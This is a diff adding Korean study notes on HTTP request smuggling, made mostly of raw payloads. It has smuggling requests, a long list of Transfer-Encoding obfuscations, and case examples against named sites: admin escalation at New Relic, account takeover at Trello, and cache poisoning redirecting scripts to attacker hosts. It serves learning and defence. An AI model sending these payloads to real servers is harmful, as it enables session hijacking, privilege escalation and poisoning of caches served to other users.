@@ -1,0 +1,514 @@
+HTTP Desync Attacks: Request Smuggling 
+
+
+Transfer-Encoding : chunked 일 경우, 기존 Content-Length 헤더가 생략되고 chunk 앞부분에
+현재 데이터 길이(16진수) CRLF 이후 데이터가 오고 마지막에 다시 CRLF가 옴
+즉 이를 이용해 큰 데이터를 웹서버에게 전송하고 받을 수 있게됨.
+
+
+HTTP/1.1 200 OK 
+Content-Type: text/plain 
+Transfer-Encoding: chunked
+
+6\r\n
+HAHWUL\r\n 
+4\r\n
+Test\r\n
+6\r\n
+isTest\r\n
+0\r\n 
+\r\n
+
+여기서  0\r\n를 통해 종료를 인지하고 0값에 대해 데이터가 전송될 크기의 16진수 값, 실제값 패턴으로 전송
+개행에 대해서도 1로 인식
+
+
+
+
+요청 공격 예시 
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Content-Length: 5
+
+12345GPOST / HTTP/1.1
+Host: example.com
+…
+
+
+Transfer-Encoding에 대해 chunked 일 경우 위의 요청은 프론트로 보내고,
+Content-Length로 지정된 길이에 대해 처리함
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GPOST / HTTP/1.1
+Host: example.com
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8   <-- 여기까지 처리되며
+SMUGGLED <----- 그다음 요청에 대한 구문
+0
+-----------------------------------------------------
+
+우회
+case by
+
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+GET / HTTP/1.1
+ Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked
+ Transfer-Encoding: chunked
+%cTransfer-Encoding%c: chunked
+%cTransfer-Encoding: chunked
+%cTransfer-Encoding: chunked%c
+%cTransfer-Encoding:%cchunked
+Content-Encoding: chunked
+TRANSFER-ENCODING: CHUNKED
+TrAnSFer-EnCODinG: cHuNkeD
+Transf\x82r-Encoding: chunked
+Transfer Encoding: chunked
+Transfer Encoding:chunked
+Transfer-Encoding : chunked
+Transfer-Encoding%c: chunked
+Transfer-Encoding%c: chunked%c
+Transfer-Encoding%c:%cchunked
+Transfer-Encoding:  chunked
+Transfer-Encoding: 'chunked'
+Transfer-Encoding: \
+Transfer-Encoding: ch\x96nked
+Transfer-Encoding: chunk
+Transfer-Encoding: chunked%c
+Transfer-Encoding: chunked%cX: X
+Transfer-Encoding: chunked%c\nX: X
+Transfer-Encoding: chunked, cow
+Transfer-Encoding: chunked\r
+Transfer-Encoding: chunked\r%cX: X
+Transfer-Encoding: chunked\t
+Transfer-Encoding: cow chunked bar
+Transfer-Encoding: cow, chunked
+Transfer-Encoding: cow\r\nTransfer-Encoding: chunked
+Transfer-Encoding:%cchunked
+Transfer-Encoding:%cchunked%c
+Transfer-Encoding:\n chunked
+Transfer-Encoding:\tchunked
+Transfer-Encoding:\u000Bchunked
+Transfer-Encoding:\xFFchunked
+Transfer-Encoding\t:\tchunked
+Transfer\r-Encoding: chunked
+Transfer_Encoding: chunked
+X: X%cTransfer-Encoding: chunked
+X: X%c\nTransfer-Encoding: chunked
+X: X\r%cTransfer-Encoding: chunked
+X:X\nTransfer-Encoding: chunked
+X:X\rTransfer-Encoding: chunked
+
+** %c: 0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF,0x7F,0x100 등
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 
+공격예시 
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+Q
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+
+
+
+
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Transfer-Encoding: zchunked
+
+11
+=x&q=smuggling&x=
+0
+ㅡ
+GET /404 HTTP/1.1
+Foo: bPOST /search HTTP/1.1
+Host: example.com
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: zchunked
+
+96
+GET /404 HTTP/1.1
+X: x=1&q=smugging&x=
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: example.com  
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST / HTTP/1.1
+Host: login.newrelic.com
+Content-Length: 142
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+0
+
+POST /login HTTP/1.1
+Host: login.newrelic.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+…
+login[email]=asdfPOST /login HTTP/1.1
+Host: login.newrelic.com
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+Please ensure that your email and password are correct.
+
+<input id="email" value="asdfPOST /login HTTP/1.1
+Host: login.newrelic.com
+X-Forwarded-For: 81.139.39.150
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external 
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+...
+GET / HTTP/1.1
+Host: staging-alerts.newrelic.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://staging-alerts.newrelic.com/
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+...
+GET / HTTP/1.1
+Host: staging-alerts.newrelic.com
+X-Forwarded-Proto: https
+
+HTTP/1.1 404 Not Found
+
+Action Controller: Exception caught 
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+...
+GET /revision_check HTTP/1.1
+Host: staging-alerts.newrelic.com
+X-Forwarded-Proto: https
+
+HTTP/1.1 200 OK
+
+Not authorized with header:
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+GET /revision_check HTTP/1.1
+Host: staging-alerts.newrelic.com
+X-Forwarded-Proto: https
+X-nr-external-service: 1
+
+HTTP/1.1 403 Forbidden
+
+Forbidden
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+
+
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+POST /login HTTP/1.1
+Host: login.newrelic.com
+Content-Length: 564
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+0
+
+POST /internal_api/934454/session HTTP/1.1
+Host: alerts.newrelic.com
+X-Forwarded-Proto: https
+Service-Gateway-Account-Id: 934454
+Service-Gateway-Is-Newrelic-Admin: true
+Content-Length: 6
+…
+x=123GET...
+
+HTTP/1.1 200 OK
+
+{
+  "user": {
+     "account_id": 934454,
+     "is_newrelic_admin": true
+  },
+  "current_account_id": 934454
+  …
+} 
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+
+Exploit
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+POST /1/cards HTTP/1.1
+Host: trello.com
+Transfer-Encoding:[tab]chunked
+Content-Length: 4
+
+9f
+PUT /1/members/1234 HTTP/1.1
+Host: trello.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+
+x=x&csrf=1234&username=testzzz&bio=cake
+0
+
+GET / HTTP/1.1
+Host: trello.com
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+Upgrading XSS
+
+
+
+POST / HTTP/1.1
+Host: saas-app.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+10
+=x&cr={creative}&x=
+66
+POST /index.php HTTP/1.1
+Host: saas-app.com
+Content-Length: 200
+
+SAML=a"><script>alert(1)</script>POST / HTTP/1.1
+Host: saas-app.com
+Cookie: …
+
+HTTP/1.1 200 OK
+…
+<input name="SAML"   value="a"><script>alert(1)</script>
+0
+
+POST / HTTP/1.1
+Host: saas-app.com
+Cookie: …
+"/>
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+DOM
+
+
+GET /assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1
+Host: www.redhat.com
+
+HTTP/1.1 200 OK
+
+<script>
+var destination = getQueryParam('redir')
+[poor filtering]
+document.location = destination
+
+
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+POST /css/style.css HTTP/1.1
+Host: www.redhat.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+Transfer-Encoding: chunked
+
+0
+
+POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1
+Host: www.redhat.com
+Content-Length: 15
+
+x=GET /en/solutions HTTP/1.1
+Host: www.redhat.com
+
+HTTP/1.1 301 Found
+Location: ../assets/idx?redir=//redhat.com@evil.net/
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+CDN Chaining
+
+
+POST /cow.jpg HTTP/1.1
+Host: redacted.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 50 
+Transfer-Encoding: chunked 
+
+0 
+
+GET / HTTP/1.1 
+Host: www.redhat.com 
+X: XGET...
+
+Red Hat - We make open source technologies for the enterprise
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+Harmless response 
+
+POST /etc/libs/xyz.js HTTP/1.1
+Host: redacted
+Content-Length: 57
+Transfer-Encoding: chunked
+
+0
+
+POST /etc HTTP/1.1
+Host: burpcollaborator.net
+X: XGET /etc/libs/xyz.js HTTP/1.1
+
+HTTP/1.1 301 Moved Permanently
+Location: https://burpcollaborator.net/etc/ 
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+Web cache deception
+
+POST / HTTP/1.1
+Transfer-Encoding: blah
+
+0
+
+GET /account/settings HTTP/1.1
+X: XGET /static/site.js HTTP/1.1
+Cookie: sessionid=xyz
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+Front-end perspective
+
+GET /static/site.js HTTP/1.1
+
+
+HTTP/1.1 200 OK
+
+Your payment history
+…
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+paypal
+
+POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
+Host: c.paypal.com
+Content-Length: 61 
+Transfer-Encoding: chunked
+
+0
+
+GET /webstatic HTTP/1.1
+Host: skeletonscribe.net?
+X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
+Host: c.paypal.com
+Connection: close
+
+HTTP/1.1 302 Found
+Location: http://skeletonscribe.net?, c.paypal.com/webstatic/
+
+
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+
+
+
+
